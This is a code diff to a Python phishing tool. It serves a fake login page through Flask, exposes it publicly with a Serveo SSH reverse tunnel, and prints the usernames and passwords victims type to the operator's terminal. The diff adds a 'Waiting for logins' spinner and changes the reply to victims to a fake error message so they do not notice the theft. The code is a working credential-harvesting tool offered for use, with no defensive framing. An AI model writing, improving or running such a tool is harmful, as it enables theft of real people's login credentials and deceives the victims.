@@ -3,10 +3,13 @@ import sys
 import logging
 import socket
 import subprocess
+import threading
+import itertools
+import time
 from flask import Flask, request, send_from_directory
 from datetime import datetime
 
-# -------- Auto-install packages --------
+# -------- Auto-install Flask --------
 def install(package):
     os.system(f"{sys.executable} -m pip install {package}")
 
@@ -22,11 +25,11 @@ if os.system("command -v ssh > /dev/null") != 0:
     os.system("pkg install -y openssh")
 
 # -------- Colors --------
-red = '\033[1;31m'
-grn = '\033[1;32m'
-ylo = '\033[1;33m'
-cyan = '\033[1;36m'
-pink = '\033[1;35m'
+red   = '\033[1;31m'
+grn   = '\033[1;32m'
+ylo   = '\033[1;33m'
+cyan  = '\033[1;36m'
+pink  = '\033[1;35m'
 reset = '\033[0m'
 
 # -------- Suppress Flask logs --------
@@ -57,17 +60,21 @@ def home():
 
 @app.route('/login', methods=["POST"])
 def login():
+    global stop_spinner
+    stop_spinner = True  # stop waiting animation
+
     username = request.form.get("username")
     password = request.form.get("password")
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
     print(f"""{pink}
 ╔══════════════════════════════╗
-║ {cyan}Username: {ylo}{username}{cyan}            
-║ {cyan}Password: {ylo}{password}{cyan}            
-║ {cyan}Time    : {ylo}{timestamp}{cyan} 
-╚══════════════════════════════╝{reset}
+║ {cyan}Username: {ylo}{username}{reset}
+║ {cyan}Password: {ylo}{password}{reset}
+║ {cyan}Time    : {ylo}{timestamp}{reset}
+╚══════════════════════════════╝
 """)
-    return "Login received! Check terminal."
+    return "something wrong try again later :("
 
 # -------- Find free port --------
 def get_free_port(start_port=8080):
@@ -78,21 +85,41 @@ def get_free_port(start_port=8080):
                 return port
             port += 1
 
-# -------- Run Flask on available port --------
+# -------- Spinner Animation --------
+stop_spinner = False
+def spinner():
+    for c in itertools.cycle(['|', '/', '-', '\\']):
+        if stop_spinner:
+            break
+        sys.stdout.write(f"\r{pink}[{cyan}*{pink}] Waiting for logins... {c}{reset} ")
+        sys.stdout.flush()
+        time.sleep(0.1)
+    sys.stdout.write(f"\r{grn}[✓] Login captured!            {reset}\n")
+
+# -------- Run Flask + Serveo --------
 def run_server():
     port = get_free_port(8080)
-    print(f"{grn}Local server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
-    print(f"{pink}Waiting for logins... Press Ctrl+C to stop.{reset}\n")
+
+    print(f"{pink}╔══════════════════════════════╗")
+    print(f"{pink}║ {cyan}Starting server...{reset}")
+    print(f"{pink}╚══════════════════════════════╝{reset}\n")
 
     # Start Serveo tunnel in background
-    print(f"{grn}Opening public tunnel via Serveo...{reset}")
     ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
     process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
 
-    # Print tunnel URL when Serveo responds
+    # Print tunnel URL nicely
     for line in process.stdout:
         if "Forwarding HTTP" in line:
-            print(f"{ylo}Public URL: {cyan}{line.strip().split()[-1]}{reset}\n")
+            public_url = line.strip().split()[-1]
+            print(f"""{grn}
+╔══════════════════════════════╗
+║ {cyan}Public Link: {ylo}{public_url}{reset}
+╚══════════════════════════════╝
+""")
+
+            # Start spinner animation
+            threading.Thread(target=spinner, daemon=True).start()
             break
 
     # Run Flask (blocking)
@@ -111,6 +138,6 @@ if __name__ == "__main__":
 ╚══════════════════════════════╝
 {reset}""")
     choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
-    selected_html = "1.html" if choice == "1" else "2.html"
+    selected_html = "11.html" if choice == "1" else "2.html"
 
     run_server()
